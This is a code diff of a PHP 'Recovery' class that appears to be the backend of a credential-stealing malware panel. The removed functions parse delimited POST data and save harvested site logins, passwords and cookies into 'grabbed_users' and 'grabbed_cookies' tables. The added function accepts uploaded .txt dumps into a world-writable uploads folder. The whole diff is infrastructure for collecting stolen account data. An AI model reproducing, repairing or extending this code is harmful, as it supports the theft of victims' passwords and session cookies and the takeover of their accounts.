@@ -4,57 +4,45 @@ class Recovery
 {
 
 
-    public function passwordrecovery()
+    public function upload()
     {
-        //$fancyUserArray = array();
-        if (!empty($_POST["pass"])) {
-            $users = explode("#N_U#", $_POST["pass"]);
-            foreach ($users as $postdatauser) {
-                if (!empty($postdatauser)) {
-                    $exploded = explode("#dark~#", $postdatauser);
-                    if (is_array($exploded) && !empty($exploded)) {
-                        $tempuser = array(
-                            "site" => $exploded[1],
-                            "user" => $exploded[2],
-                            "pass" => $exploded[3],
-                        );
-                        //$fancyUserArray[] = $tempuser;
-                        $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM grabbed_users WHERE username LIKE :user AND password LIKE :pass AND site LIKE :site");
-                        $statement->execute($tempuser);
-                        $exists = $statement->fetch();
-                        if(!$exists){
-                            $statement = $GLOBALS["pdo"]->prepare("INSERT INTO grabbed_users (username, password, site) VALUES (:user, :pass, :site)");
-                            $statement->execute($tempuser);
-                        }
-                    }
-                }
+
+        $target_dir = "uploads/";
+        if (!file_exists($target_dir)) {
+            mkdir($target_dir, 0777, true);
+        }
+        if(empty($_FILES["media"]["name"])){
+            die();
+        }
+
+        $target_file = $target_dir . basename($_FILES["media"]["name"]);
+        $uploadOk = 1;
+        $imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));
+
+// Check if file already exists
+        if (file_exists($target_file)) {
+            unlink($target_file); //remove the file
+        }
+
+// Allow certain file formats
+        if ($imageFileType != "txt") {
+            echo "Sorry, only txt are allowed.";
+            $uploadOk = 0;
+        }
+// Check if $uploadOk is set to 0 by an error
+        if ($uploadOk == 0) {
+            echo "Sorry, your file was not uploaded.";
+// if everything is ok, try to upload file
+        } else {
+            if (move_uploaded_file($_FILES["media"]["tmp_name"], $target_file)) {
+                echo "The file " . basename($_FILES["media"]["name"]) . " has been uploaded.";
+            } else {
+                echo "Sorry, there was an error uploading your file.";
             }
-            //var_dump($fancyUserArray);
         }
-        die();
-    }
-
-    public function cookierecovery(){
-        $cookie =  explode("#D|C#",$_POST["cookies"]);
-        $details = explode("#dark~#",$cookie[1]);
-
-        $detailsArray = array(
-            "site" => $details[1],
-            "cookiename" => $details[2],
-            "cookie" => $details[3],
-        );
-        $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM grabbed_cookies WHERE site LIKE :site AND cookiename LIKE :cookiename AND cookie LIKE :cookie");
-        $statement->execute($detailsArray);
-        $exists = $statement->fetch();
-        if(!$exists){
-            $statement = $GLOBALS["pdo"]->prepare("INSERT INTO grabbed_cookies (site, cookiename, cookie) VALUES (:site, :cookiename, :cookie)");
-            $statement->execute($detailsArray);
-        }
-
         //var_dump($detailsArray);
         die();
     }
-
 
 
 }
